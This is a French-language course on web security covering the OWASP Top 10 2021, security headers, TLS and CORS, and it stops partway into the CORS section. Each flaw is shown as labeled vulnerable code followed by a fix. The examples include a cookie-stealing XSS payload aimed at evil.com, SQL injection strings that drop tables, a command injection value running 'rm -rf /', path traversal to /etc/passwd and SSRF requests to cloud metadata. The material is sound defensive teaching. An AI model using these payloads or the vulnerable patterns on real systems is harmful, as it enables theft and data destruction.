# Securite Web OWASP

La securite web est un domaine critique du developpement logiciel. Une seule vulnerabilite peut compromettre les donnees de millions d'utilisateurs. L'OWASP (Open Web Application Security Project) est une fondation a but non lucratif qui produit des guides, outils et methodologies pour ameliorer la securite des applications.

Ce cours couvre le Top 10 OWASP 2021, les en-tetes de securite, CORS, CSRF, les cookies securises et le hachage de mots de passe.

> [!tip] Analogie
> La securite web, c'est comme securiser une maison. Vous pouvez avoir la meilleure serrure du monde (chiffrement), mais si vous laissez une fenetre ouverte (injection SQL), un cambrioleur entrera quand meme. Le Top 10 OWASP est une checklist des 10 fenetres les plus souvent laissees ouvertes sur le web. L'objectif n'est pas la paranoia, mais la vigilance systematique.

---

## 1. Qu'est-ce que l'OWASP ?

```
OWASP = Open Web Application Security Project

Fondation a but non lucratif (fondee en 2001)
│
├── Top 10 ── Les 10 risques les plus critiques (mis a jour ~tous les 3-4 ans)
├── ASVS ──── Application Security Verification Standard (checklist detaillee)
├── Testing Guide ── Methodologie de test de securite
├── ZAP ──── Outil open-source de test de penetration
├── Cheat Sheets ── Fiches pratiques par sujet
└── SAMM ──── Software Assurance Maturity Model

Le Top 10 OWASP 2021 :
┌──────┬──────────────────────────────────────────────┐
│  #   │  Categorie                                    │
├──────┼──────────────────────────────────────────────┤
│ A01  │  Broken Access Control                        │
│ A02  │  Cryptographic Failures                       │
│ A03  │  Injection                                    │
│ A04  │  Insecure Design                              │
│ A05  │  Security Misconfiguration                    │
│ A06  │  Vulnerable and Outdated Components           │
│ A07  │  Identification and Authentication Failures   │
│ A08  │  Software and Data Integrity Failures         │
│ A09  │  Security Logging and Monitoring Failures     │
│ A10  │  Server-Side Request Forgery (SSRF)           │
└──────┴──────────────────────────────────────────────┘
```

---

## 2. A01 - Broken Access Control

Le controle d'acces determine ce qu'un utilisateur authentifie a le droit de faire. Quand il est defaillant, n'importe qui peut acceder a des ressources non autorisees.

### IDOR (Insecure Direct Object Reference)

```python
# ─── VULNERABLE : l'utilisateur controle l'ID sans verification ───
@app.route("/api/factures/<int:facture_id>")
def voir_facture(facture_id):
    # N'importe qui peut voir la facture de n'importe qui !
    # Il suffit de changer l'ID dans l'URL :
    # /api/factures/1, /api/factures/2, /api/factures/3...
    facture = db.get_facture(facture_id)
    return jsonify(facture)
```

```python
# ─── CORRIGE : verifier que la facture appartient a l'utilisateur ───
@app.route("/api/factures/<int:facture_id>")
@login_required
def voir_facture(facture_id):
    facture = db.get_facture(facture_id)
    if facture is None:
        abort(404)
    # Verification : la facture appartient-elle a l'utilisateur connecte ?
    if facture.user_id != current_user.id:
        abort(403)  # Forbidden
    return jsonify(facture)
```

### Path Traversal

```javascript
// ─── VULNERABLE : l'utilisateur peut naviguer dans le systeme de fichiers ───
app.get("/download", (req, res) => {
    const fichier = req.query.file;
    // Attaque : ?file=../../../etc/passwd
    res.sendFile(`/uploads/${fichier}`);
});
```

```javascript
// ─── CORRIGE : valider et normaliser le chemin ───
const path = require("path");

app.get("/download", (req, res) => {
    const fichier = req.query.file;
    const cheminComplet = path.resolve("/uploads", fichier);

    // Verifier que le chemin reste dans /uploads
    if (!cheminComplet.startsWith("/uploads/")) {
        return res.status(400).send("Chemin invalide");
    }

    // Verifier que le fichier existe
    if (!fs.existsSync(cheminComplet)) {
        return res.status(404).send("Fichier non trouve");
    }

    res.sendFile(cheminComplet);
});
```

### Verification d'autorisation manquante

```javascript
// ─── VULNERABLE : pas de verification de role ───
app.delete("/api/users/:id", (req, res) => {
    // N'importe quel utilisateur connecte peut supprimer des comptes !
    db.deleteUser(req.params.id);
    res.json({ message: "Utilisateur supprime" });
});
```

```javascript
// ─── CORRIGE : middleware de verification de role ───
function requireRole(role) {
    return (req, res, next) => {
        if (!req.user) return res.status(401).json({ error: "Non authentifie" });
        if (req.user.role !== role) {
            return res.status(403).json({ error: "Acces interdit" });
        }
        next();
    };
}

app.delete("/api/users/:id", requireRole("admin"), (req, res) => {
    db.deleteUser(req.params.id);
    res.json({ message: "Utilisateur supprime" });
});
```

> [!warning] Principe du moindre privilege
> Par defaut, tout doit etre **interdit**. Les acces sont ensuite ouverts explicitement. Ne jamais faire l'inverse (tout autoriser puis bloquer certaines choses). Ce principe s'applique aux API, aux fichiers, aux bases de donnees, et aux roles utilisateur.

### Prevention

```
1. Verifier les autorisations cote SERVEUR (jamais cote client uniquement)
2. Refuser par defaut (deny by default)
3. Utiliser des UUIDs au lieu d'IDs incrementaux (plus difficile a deviner)
4. Logger les tentatives d'acces non autorisees
5. Implementer un Rate Limiting pour limiter les tentatives
6. Ne jamais exposer d'ID interne dans les URLs sans controle
```

---

## 3. A02 - Cryptographic Failures

Les donnees sensibles (mots de passe, numeros de carte, donnees medicales) doivent etre protegees au repos et en transit.

### Mots de passe en clair

```python
# ─── CATASTROPHE : stocker les mots de passe en clair ───
def creer_utilisateur(nom, mot_de_passe):
    # Si la base est compromise, TOUS les mots de passe sont lisibles !
    db.execute("INSERT INTO users (nom, password) VALUES (?, ?)",
               (nom, mot_de_passe))

# ─── MAUVAIS : hashage faible (MD5, SHA1, SHA256 seuls) ───
import hashlib
hash_mdp = hashlib.sha256(mot_de_passe.encode()).hexdigest()
# Vulnerable aux rainbow tables et au brute force rapide
# SHA256 peut calculer des MILLIARDS de hash par seconde
```

```python
# ─── CORRECT : utiliser bcrypt ou argon2 ───
import bcrypt

def creer_utilisateur(nom, mot_de_passe):
    # bcrypt : hash lent par conception + sel automatique
    sel = bcrypt.gensalt(rounds=12)  # 12 = facteur de cout
    hash_mdp = bcrypt.hashpw(mot_de_passe.encode(), sel)
    db.execute("INSERT INTO users (nom, password_hash) VALUES (?, ?)",
               (nom, hash_mdp))

def verifier_mot_de_passe(mot_de_passe, hash_stocke):
    return bcrypt.checkpw(mot_de_passe.encode(), hash_stocke)
```

### Comparaison des algorithmes de hachage

```
+------------------+------------------+------------------+-------------------+
| Algorithme       | Vitesse          | Sel integre      | Usage             |
+------------------+------------------+------------------+-------------------+
| MD5              | Tres rapide      | Non              | JAMAIS pour mdp   |
| SHA-256          | Tres rapide      | Non              | Signatures, pas   |
|                  |                  |                  | mdp               |
| bcrypt           | Lent (reglable)  | Oui (auto)       | Mots de passe     |
| scrypt           | Lent (reglable)  | Oui              | Mots de passe     |
| Argon2           | Lent (reglable)  | Oui              | Mots de passe     |
|                  |                  |                  | (recommande OWASP)|
+------------------+------------------+------------------+-------------------+

Pourquoi "lent" est BIEN pour les mots de passe ?
─────────────────────────────────────────────────
SHA-256 : ~10 milliards de hash/sec (GPU)  → Brute force trivial
bcrypt  : ~10 000 hash/sec                 → Brute force impraticable
Argon2  : ~1 000 hash/sec (+ memoire)      → Meme les GPU ne suffisent pas
```

> [!info] Le sel (salt)
> Un sel est une valeur aleatoire ajoutee au mot de passe avant le hachage. Il garantit que deux utilisateurs avec le meme mot de passe ont des hachages differents. Bcrypt et Argon2 generent et stockent le sel automatiquement dans le hash resultat.

### HTTPS obligatoire

```
HTTP (pas de chiffrement) :
Client ──────── "password123" en clair ──────── Serveur
                ^
                │ N'importe qui sur le reseau peut lire !
                │ (Wi-Fi public, FAI, routeur compromis)

HTTPS (TLS/SSL) :
Client ──── tunnel chiffre ──── Serveur
             │
             │ Le contenu est illisible sans la cle
             │ Meme sur un Wi-Fi public
```

---

## 4. A03 - Injection

L'injection survient quand des donnees non fiables sont envoyees a un interpreteur comme partie d'une commande ou requete. C'est le risque le plus "classique" et le mieux compris, mais il reste extremement courant.

### Injection SQL

```python
# ─── VULNERABLE : concatenation de chaines ───
def chercher_utilisateur(nom):
    requete = f"SELECT * FROM users WHERE nom = '{nom}'"
    # Attaque : nom = "' OR '1'='1' --"
    # Requete resultante : SELECT * FROM users WHERE nom = '' OR '1'='1' --'
    # Retourne TOUS les utilisateurs !
    return db.execute(requete)

# Attaque plus dangereuse : nom = "'; DROP TABLE users; --"
# Requete : SELECT * FROM users WHERE nom = ''; DROP TABLE users; --'
# La table est SUPPRIMEE !
```

```python
# ─── CORRIGE : requetes parametrees (prepared statements) ───
def chercher_utilisateur(nom):
    # Le ? (ou %s selon le driver) est un placeholder
    # La valeur est passee separement, jamais interpolee dans la requete
    requete = "SELECT * FROM users WHERE nom = ?"
    return db.execute(requete, (nom,))
    # Meme si nom = "' OR '1'='1", il sera traite comme une VALEUR littérale
    # et non comme du SQL
```

```javascript
// ─── JavaScript + Node.js (meme principe) ───

// VULNERABLE
app.get("/user", (req, res) => {
    const nom = req.query.name;
    db.query(`SELECT * FROM users WHERE name = '${nom}'`);  // JAMAIS !
});

// CORRIGE (avec le driver mysql2 par exemple)
app.get("/user", (req, res) => {
    const nom = req.query.name;
    db.query("SELECT * FROM users WHERE name = ?", [nom]);  // Parametre
});
```

### XSS (Cross-Site Scripting)

Le XSS permet a un attaquant d'injecter du JavaScript malveillant dans les pages vues par d'autres utilisateurs.

#### XSS Stocke (Stored)

```javascript
// ─── VULNERABLE : le commentaire est stocke en base puis affiche ───
// L'attaquant poste un commentaire contenant du JS :
// <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// Cote serveur, le commentaire est stocke tel quel dans la base
// Quand un autre utilisateur visite la page :
app.get("/article/:id", (req, res) => {
    const article = db.getArticle(req.params.id);
    const commentaires = db.getCommentaires(req.params.id);

    // VULNERABLE : le HTML du commentaire est insere tel quel
    res.send(`
        <h1>${article.titre}</h1>
        <div>${article.contenu}</div>
        <div class="commentaires">
            ${commentaires.map(c => `<p>${c.texte}</p>`).join("")}
        </div>
    `);
    // Le <script> du commentaire s'execute dans le navigateur de la victime !
});
```

#### XSS Reflechi (Reflected)

```javascript
// ─── VULNERABLE : le parametre URL est reflechi dans la page ───
app.get("/recherche", (req, res) => {
    const terme = req.query.q;
    // URL d'attaque : /recherche?q=<script>alert(document.cookie)</script>
    res.send(`<p>Resultats pour : ${terme}</p>`);
});
```

#### XSS Base sur le DOM (DOM-based)

```javascript
// ─── VULNERABLE : cote client uniquement ───
// URL : page.html#<img src=x onerror=alert('XSS')>
const hash = window.location.hash.substring(1);
document.getElementById("output").innerHTML = hash; // Injection via innerHTML !
```

#### Prevention XSS

```javascript
// 1. Echapper le HTML (output encoding)
function echapper(texte) {
    const map = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
    };
    return texte.replace(/[&<>"']/g, c => map[c]);
}

// 2. Utiliser textContent au lieu de innerHTML
element.textContent = donneeUtilisateur;  // Sur, echappe automatiquement
// element.innerHTML = donneeUtilisateur; // DANGEREUX

// 3. Content Security Policy (en-tete HTTP)
// Voir section "En-tetes de securite" plus bas

// 4. Validation et sanitisation cote serveur
// Utiliser des bibliotheques comme DOMPurify (JS) ou bleach (Python)
```

### Command Injection

```python
# ─── VULNERABLE : execution de commande systeme avec input utilisateur ───
import os

def ping_host(adresse):
    # Attaque : adresse = "8.8.8.8; rm -rf /"
    os.system(f"ping -c 4 {adresse}")

# ─── CORRIGE : utiliser subprocess avec une liste (pas de shell) ───
import subprocess

def ping_host(adresse):
    # Valider l'entree d'abord
    import re
    if not re.match(r'^[\w.\-]+$', adresse):
        raise ValueError("Adresse invalide")

    # subprocess avec shell=False (defaut) et liste d'arguments
    result = subprocess.run(
        ["ping", "-c", "4", adresse],
        capture_output=True, text=True, timeout=10
    )
    return result.stdout
```

> [!warning] Regle d'or contre les injections
> **Ne jamais construire de commandes (SQL, shell, HTML) par concatenation avec des donnees utilisateur.** Utiliser systematiquement : requetes parametrees (SQL), listes d'arguments (shell), echappement/textContent (HTML).

---

## 5. A04 - Insecure Design

Contrairement aux bugs d'implementation, les defauts de conception sont des problemes architecturaux. Aucun correctif ponctuel ne peut les resoudre ; il faut repenser la conception.

### Threat Modeling (Modelisation des menaces)

```
Methode STRIDE :
┌────────────┬──────────────────────────────────────────────┐
│ Menace     │ Description                                   │
├────────────┼──────────────────────────────────────────────┤
│ Spoofing   │ Usurper l'identite d'un utilisateur/systeme  │
│ Tampering  │ Modifier des donnees en transit ou au repos   │
│ Repudiation│ Nier avoir effectue une action                │
│ Info Discl.│ Exposer des donnees confidentielles           │
│ DoS        │ Rendre le service indisponible                │
│ Elevation  │ Obtenir des privileges non autorises          │
└────────────┴──────────────────────────────────────────────┘

Processus de Threat Modeling :
1. Identifier les actifs (donnees sensibles, fonctionnalites critiques)
2. Diagrammer les flux de donnees (qui envoie quoi a qui)
3. Identifier les menaces (STRIDE) pour chaque flux
4. Evaluer le risque (probabilite x impact)
5. Definir les contre-mesures
6. Revoir regulierement (a chaque changement d'architecture)
```

### Security by Design

```
Principes :
───────────
1. Defense en profondeur  : plusieurs couches de securite
   (auth + authz + validation + chiffrement + monitoring)

2. Fail securely : en cas d'erreur, refuser l'acces (pas l'accorder)
   if (!estAutorise) { return REFUSER; }  // Pas l'inverse

3. Separation des privileges : un admin ne devrait pas pouvoir
   tout faire avec un seul compte/token

4. Minimiser la surface d'attaque : desactiver tout ce qui n'est
   pas necessaire (ports, endpoints, fonctionnalites)

5. Ne jamais faire confiance au client : TOUT valider cote serveur
   (la validation JS cote client est une commodite UX, pas de la securite)
```

> [!info] Exemple de defaut de conception
> Un systeme de reinitialisation de mot de passe qui envoie le nouveau mot de passe par email en clair est un defaut de **conception**, pas d'implementation. Meme si le code est "propre", le design est fondamentalement non securise. La bonne conception : envoyer un lien a usage unique avec expiration.

---

## 6. A05 - Security Misconfiguration

Les erreurs de configuration sont parmi les vulnerabilites les plus frequentes car elles ne necessitent aucune faille dans le code.

### Erreurs courantes

```
1. Credentials par defaut
   ─────────────────────
   admin:admin, root:root, admin:password
   Base de donnees sans mot de passe (MongoDB, Redis par defaut)

2. Messages d'erreur verbeux
   ─────────────────────────
   MAUVAIS (en production) :
   "Error: SQLSTATE[42S02]: Table 'users_backup' not found
    at /var/www/app/models/User.php:42
    Stack trace: ..."

   → Revele la structure de la base, les chemins de fichiers,
     la technologie utilisee

   BON (en production) :
   "Une erreur est survenue. Veuillez reessayer."
   (+ log detaille cote serveur, invisible pour l'utilisateur)

3. Fonctionnalites inutiles activees
   ─────────────────────────────────
   - Page d'admin /admin accessible sans auth
   - Listage de repertoire active sur le serveur web
   - phpinfo() accessible publiquement
   - Debug mode actif en production (Django DEBUG=True, Flask debug=True)
   - Ports ouverts inutilement (base de donnees sur le reseau public)
```

```python
# ─── Django : configuration prod vs dev ───

# settings_dev.py (developpement)
DEBUG = True
ALLOWED_HOSTS = ["*"]

# settings_prod.py (production)
DEBUG = False                          # JAMAIS True en prod
ALLOWED_HOSTS = ["monsite.com"]        # Restreindre
SECRET_KEY = os.environ["SECRET_KEY"]  # Depuis variable d'env, pas dans le code
SECURE_SSL_REDIRECT = True             # Forcer HTTPS
SESSION_COOKIE_SECURE = True           # Cookies uniquement en HTTPS
CSRF_COOKIE_SECURE = True
```

### Prevention

```
[ ] Changer tous les mots de passe par defaut
[ ] Desactiver le mode debug en production
[ ] Supprimer les pages de test/exemple
[ ] Configurer les en-tetes de securite (voir section dediee)
[ ] Restreindre les ports ouverts au strict minimum
[ ] Desactiver le listage de repertoires
[ ] Utiliser des variables d'environnement pour les secrets
[ ] Automatiser la verification de configuration (linters de securite)
```

---

## 7. A06 - Vulnerable and Outdated Components

Les applications modernes dependent de centaines de bibliotheques tierces. Une seule vulnerabilite dans une dependance peut compromettre toute l'application.

### Le probleme

```
Votre application
├── express@4.17.1
│   ├── body-parser@1.19.0
│   │   └── qs@6.7.0  ← Vulnerabilite connue (CVE-2022-xxxx)
│   └── ...
├── lodash@4.17.15  ← Prototype pollution (CVE-2020-8203)
└── ... (300+ dependances transitives)

Vous n'avez importe que 5 paquets,
mais npm a installe 300+ dependances.
UNE SEULE suffit pour compromettre l'application.
```

### Outils de detection

```bash
# ─── npm (JavaScript) ───
npm audit                     # Lister les vulnerabilites connues
npm audit fix                 # Corriger automatiquement (mises a jour mineures)
npm audit fix --force         # Forcer les mises a jour majeures (risque de casse)
npm outdated                  # Voir les paquets obsoletes

# ─── pip (Python) ───
pip install pip-audit
pip-audit                     # Scanner les vulnerabilites
pip list --outdated           # Voir les paquets obsoletes

# ─── Outils generaux ───
# Snyk     : snyk test (multi-langages, gratuit pour open-source)
# Trivy    : trivy fs . (scanner de vulnerabilites)
# OWASP Dependency-Check : analyse statique des dependances
```

```yaml
# ─── GitHub Dependabot (.github/dependabot.yml) ───
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

> [!tip] Analogie
> Les dependances sont comme les ingredients d'un plat. Vous avez beau etre un excellent cuisinier, si un ingredient est contamine, le plat entier est compromis. `npm audit` et `pip-audit` sont vos controles sanitaires.

### Prevention

```
1. Tenir un inventaire des dependances (package-lock.json, requirements.txt)
2. Scanner regulierement (CI/CD pipeline)
3. Mettre a jour frequemment (les petites MAJ sont moins risquees)
4. Supprimer les dependances inutilisees
5. Preferer les bibliotheques activement maintenues
6. Verifier les licences (certaines sont incompatibles)
7. Eviter de copier-coller du code de Stack Overflow sans comprendre
```

---

## 8. A07 - Identification and Authentication Failures

### Brute Force

```python
# ─── VULNERABLE : pas de limitation de tentatives ───
@app.route("/login", methods=["POST"])
def login():
    nom = request.form["username"]
    mdp = request.form["password"]

    user = db.get_user(nom)
    if user and verify_password(mdp, user.password_hash):
        session["user_id"] = user.id
        return redirect("/dashboard")
    return "Identifiants incorrects", 401
    # Un attaquant peut essayer des millions de combinaisons !
```

```python
# ─── CORRIGE : rate limiting + verrouillage progressif ───
from functools import wraps
from time import time

tentatives = {}  # En production : utiliser Redis

def rate_limit_login(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        ip = request.remote_addr
        maintenant = time()

        if ip in tentatives:
            nb, dernier = tentatives[ip]
            # Verrouillage progressif : 1s, 2s, 4s, 8s... (max 5 min)
            delai = min(2 ** nb, 300)
            if maintenant - dernier < delai:
                return f"Trop de tentatives. Reessayez dans {delai}s.", 429
        return f(*args, **kwargs)
    return wrapper

@app.route("/login", methods=["POST"])
@rate_limit_login
def login():
    nom = request.form["username"]
    mdp = request.form["password"]
    ip = request.remote_addr

    user = db.get_user(nom)
    if user and verify_password(mdp, user.password_hash):
        tentatives.pop(ip, None)  # Reset
        session["user_id"] = user.id
        return redirect("/dashboard")

    # Enregistrer la tentative echouee
    nb = tentatives.get(ip, (0, 0))[0]
    tentatives[ip] = (nb + 1, time())

    # Message generique (ne pas reveler si c'est le nom ou le mdp qui est faux)
    return "Identifiants incorrects", 401
```

### Session Fixation

```
Attaque Session Fixation :
──────────────────────────
1. L'attaquant obtient un ID de session valide (en visitant le site)
   Session ID = "abc123"

2. L'attaquant envoie un lien a la victime :
   https://bank.com/?sessionid=abc123

3. La victime clique, se connecte. Le serveur garde le meme session ID.

4. L'attaquant utilise "abc123" → Il est connecte comme la victime !

Prevention :
────────────
- Regenerer l'ID de session apres chaque authentification
- Ne JAMAIS accepter un session ID depuis l'URL
- Utiliser des cookies HttpOnly + Secure
```

### Authentification multi-facteurs (MFA)

```
Facteurs d'authentification :
┌──────────────────────┬──────────────────────┬──────────────────────┐
│ Ce que vous SAVEZ     │ Ce que vous AVEZ      │ Ce que vous ETES     │
│ (knowledge)           │ (possession)           │ (inherence)          │
├──────────────────────┼──────────────────────┼──────────────────────┤
│ Mot de passe          │ Telephone (SMS/TOTP)  │ Empreinte digitale   │
│ Code PIN              │ Cle de securite (YK)  │ Reconnaissance face  │
│ Question secrete (*)  │ Badge                 │ Voix                 │
└──────────────────────┴──────────────────────┴──────────────────────┘
(*) Les questions secretes sont considerees comme faibles

MFA = combiner au moins 2 facteurs de categories DIFFERENTES
Mot de passe + code SMS = MFA (savoir + avoir)
Mot de passe + PIN     = PAS MFA (savoir + savoir)

Methodes MFA par ordre de securite :
1. Cle de securite physique (FIDO2/WebAuthn) ── la plus sure
2. Application TOTP (Google Authenticator, Authy)
3. Push notification (Duo, Microsoft Authenticator)
4. SMS (vulnerable au SIM swapping, mais mieux que rien)
```

---

## 9. A08 - Software and Data Integrity Failures

### Mises a jour non signees

```
Attaque de la chaine d'approvisionnement (supply chain) :
──────────────────────────────────────────────────────────

Scenario normal :
Developpeur ──> npm publish ──> npm registry ──> npm install ──> Utilisateur

Attaque :
1. Attaquant compromet le compte npm d'un mainteneur populaire
2. Publie une version malveillante du paquet
3. Des milliers de projets installent la MAJ automatiquement

Exemples reels :
- event-stream (2018) : backdoor dans un paquet npm installe 2M fois/semaine
- ua-parser-js (2021) : crypto-miner injecte
- SolarWinds (2020) : MAJ logicielle compromise, 18 000 organisations affectees
```

### Prevention

```
1. Verifier l'integrite des paquets
   npm install --integrity        # Verifie les checksums
   pip install --require-hashes   # Exige les hash dans requirements.txt

2. Epingler les versions (lockfiles)
   package-lock.json   # npm
   yarn.lock           # yarn
   requirements.txt    # pip (avec ==, pas >=)

3. Securiser le pipeline CI/CD
   - Signer les commits (GPG)
   - Proteger les branches principales
   - Exiger des reviews pour les merges
   - Scanner les dependances dans la CI

4. Sous-resource Integrity (SRI) pour les CDN
```

```html
<!-- SRI : verifier l'integrite des scripts externes -->
<script
    src="https://cdn.example.com/lib.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxAh6VgnL6DrtNTy1sKQ7jI8fM3xzO"
    crossorigin="anonymous">
</script>
<!-- Si le fichier est modifie sur le CDN, le navigateur refuse de l'executer -->
```

---

## 10. A09 - Security Logging and Monitoring Failures

### Quoi logger

```
A LOGGER :                              A NE PAS LOGGER :
──────────                              ──────────────────
- Tentatives de connexion (reussies     - Mots de passe (meme haches)
  ET echouees)                          - Numeros de carte bancaire
- Changements de privileges             - Tokens/cles d'API
- Acces a des ressources sensibles      - Donnees personnelles (RGPD)
- Erreurs d'autorisation (403)          - Donnees medicales
- Erreurs d'entree (validation)         - Contenu des messages prives
- Actions administratives
- Modifications de configuration
- Exports de donnees

Format recommande (structure) :
{
    "timestamp": "2024-01-15T10:30:00Z",
    "level": "WARNING",
    "event": "login_failed",
    "ip": "192.168.1.100",
    "user_agent": "Mozilla/5.0...",
    "username": "alice",         // OK : le nom, PAS le mot de passe
    "attempt_count": 5,
    "source": "auth_controller"
}
```

```python
# ─── Exemple de logging securise en Python ───
import logging
import json

logger = logging.getLogger("security")

def log_evenement_securite(event_type, details, level="WARNING"):
    """Logger un evenement de securite de maniere structuree."""
    evenement = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "type": event_type,
        "ip": request.remote_addr,
        "user_id": getattr(current_user, "id", "anonymous"),
        **details
    }
    # NE PAS logger de donnees sensibles
    for cle_sensible in ["password", "token", "credit_card", "ssn"]:
        evenement.pop(cle_sensible, None)

    logger.log(getattr(logging, level), json.dumps(evenement))

# Utilisation
log_evenement_securite("login_failed", {
    "username": "alice",
    "reason": "invalid_password",
    "attempt_count": 3
})
```

### Monitoring et alertes

```
Evenements qui doivent declencher une ALERTE :
──────────────────────────────────────────────
- 10+ tentatives de connexion echouees en 1 minute (meme IP)
- Connexion depuis un pays inhabituel
- Acces admin en dehors des heures de bureau
- Pic anormal de requetes (potentiel DDoS)
- Tentative d'acces a /admin, /phpmyadmin, /.env, etc.
- Modification de masse de donnees
- Erreurs 500 en cascade

Outils :
- ELK Stack (Elasticsearch, Logstash, Kibana)
- Grafana + Loki
- Datadog
- Sentry (erreurs applicatives)
- AWS CloudWatch / GCP Cloud Logging
```

> [!warning] Les logs sont inutiles si personne ne les regarde
> Avoir des logs sans monitoring, c'est comme avoir une camera de securite que personne ne regarde. Configurez des alertes automatiques pour les evenements critiques. La detection rapide d'une intrusion limite considerablement les degats.

---

## 11. A10 - Server-Side Request Forgery (SSRF)

Le SSRF permet a un attaquant de faire envoyer des requetes par le serveur vers des ressources internes normalement inaccessibles.

```
Fonctionnement :
────────────────
L'application permet de charger une URL (apercu, webhook, import...) :

Normal :
Utilisateur → Serveur → GET https://example.com/image.jpg → Affiche

Attaque SSRF :
Utilisateur → Serveur → GET http://localhost:6379/ → Acces a Redis interne !
Utilisateur → Serveur → GET http://169.254.169.254/meta-data → Cles AWS !
Utilisateur → Serveur → GET http://192.168.1.10:3306/ → Base de donnees interne !
```

```python
# ─── VULNERABLE ───
import requests

@app.route("/preview")
def preview():
    url = request.args.get("url")
    # L'utilisateur peut pointer vers N'IMPORTE QUELLE URL
    # y compris localhost, le reseau interne, les metadata cloud...
    response = requests.get(url)
    return response.text

# ─── CORRIGE ───
from urllib.parse import urlparse
import ipaddress

DOMAINES_INTERDITS = {"localhost", "127.0.0.1", "0.0.0.0", "169.254.169.254"}
RESEAUX_PRIVES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def est_url_sure(url):
    """Verifier que l'URL ne pointe pas vers une ressource interne."""
    parsed = urlparse(url)

    # Seuls HTTP et HTTPS sont autorises
    if parsed.scheme not in ("http", "https"):
        return False

    hostname = parsed.hostname
    if not hostname:
        return False

    # Verifier les domaines interdits
    if hostname in DOMAINES_INTERDITS:
        return False

    # Resoudre le DNS et verifier l'IP
    try:
        import socket
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
        for reseau in RESEAUX_PRIVES:
            if ip in reseau:
                return False
    except (socket.gaierror, ValueError):
        return False

    return True

@app.route("/preview")
def preview():
    url = request.args.get("url")
    if not est_url_sure(url):
        return "URL non autorisee", 400

    response = requests.get(url, timeout=5)
    return response.text
```

---

## 12. HTTPS et TLS

### Le Handshake TLS (simplifie)

```
Client (navigateur)                    Serveur
        │                                │
        │── 1. ClientHello ──────────────>│  (versions TLS, cipher suites)
        │                                │
        │<── 2. ServerHello ─────────────│  (version choisie, cipher suite)
        │<── 3. Certificat ──────────────│  (certificat X.509 du serveur)
        │                                │
        │── 4. Verification ──>          │  (Le client verifie le certificat
        │   (chaine de confiance,        │   aupres de l'autorite de cert.)
        │    date de validite,           │
        │    nom de domaine)             │
        │                                │
        │── 5. Echange de cle ──────────>│  (cle de session, chiffrement
        │<── 6. Confirmation ────────────│   asymetrique → symetrique)
        │                                │
        │<═══ 7. Communication ═════════>│  (chiffrement symetrique AES
        │      chiffree (HTTPS)          │   avec la cle de session)

Apres le handshake :
- Confidentialite : les donnees sont chiffrees
- Integrite : un MAC verifie que les donnees ne sont pas alterees
- Authenticite : le certificat prouve l'identite du serveur
```

> [!info] Let's Encrypt
> Let's Encrypt fournit des certificats TLS **gratuits** et automatiques. Il n'y a plus aucune excuse pour ne pas utiliser HTTPS. Certbot permet d'automatiser le renouvellement.

---

## 13. En-tetes de Securite HTTP

### Les en-tetes essentiels

```
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Content-Security-Policy (CSP)

```
CSP controle les sources de contenu autorisees dans la page.
C'est la defense la plus efficace contre le XSS.

Content-Security-Policy: default-src 'self';
                         script-src 'self' https://cdn.example.com;
                         style-src 'self' 'unsafe-inline';
                         img-src 'self' data: https:;
                         font-src 'self' https://fonts.gstatic.com;
                         connect-src 'self' https://api.example.com;
                         frame-src 'none';
                         object-src 'none';

Directives :
┌───────────────┬───────────────────────────────────────────────┐
│ Directive      │ Controle                                      │
├───────────────┼───────────────────────────────────────────────┤
│ default-src    │ Fallback pour toutes les directives           │
│ script-src     │ Sources JavaScript                            │
│ style-src      │ Sources CSS                                   │
│ img-src        │ Sources d'images                              │
│ connect-src    │ Sources pour fetch/XHR/WebSocket              │
│ font-src       │ Sources de polices                            │
│ frame-src      │ Sources pour <iframe>                         │
│ object-src     │ Sources pour <object>, <embed>                │
│ media-src      │ Sources audio/video                           │
│ report-uri     │ URL ou envoyer les violations                 │
└───────────────┴───────────────────────────────────────────────┘

Valeurs speciales :
'self'          : meme origine
'none'          : rien n'est autorise
'unsafe-inline' : autorise le JS/CSS inline (a eviter si possible)
'unsafe-eval'   : autorise eval() (a eviter)
'nonce-abc123'  : autorise les tags avec le nonce correspondant
```

```html
<!-- Utilisation d'un nonce pour autoriser un script inline specifique -->
<!-- Le nonce doit etre unique a chaque requete et genere cote serveur -->
<script nonce="abc123">
    // Ce script est autorise car son nonce correspond au CSP
    console.log("Script legitime");
</script>

<!-- Ce script sera BLOQUE car il n'a pas de nonce valide -->
<script>
    alert("Ceci sera bloque par CSP");
</script>
```

### Autres en-tetes

```
X-Frame-Options
────────────────
Empeche l'inclusion de la page dans un <iframe> (clickjacking)
X-Frame-Options: DENY              → Jamais dans un iframe
X-Frame-Options: SAMEORIGIN        → Seulement par le meme domaine

Strict-Transport-Security (HSTS)
─────────────────────────────────
Force le navigateur a utiliser HTTPS pendant une duree donnee
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
→ Pendant 1 an, le navigateur refuse toute connexion HTTP a ce domaine

X-Content-Type-Options
──────────────────────
Empeche le navigateur de "deviner" le type MIME
X-Content-Type-Options: nosniff
→ Si un fichier .txt contient du JavaScript, il ne sera PAS execute
```

---

## 14. CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy

```
Same-Origin Policy (SOP) = politique de securite du navigateur

Deux URLs ont la MEME ORIGINE si elles partagent :
protocole + domaine + port

https://example.com:443/page1    ← Origine
https://example.com:443/page2    ← Meme origine (meme proto, domaine, port)
http://example.com:443/page1     ← Origine DIFFERENTE (http vs https)
https://api.example.com:443/data ← Origine DIFFERENTE (sous-domaine different)
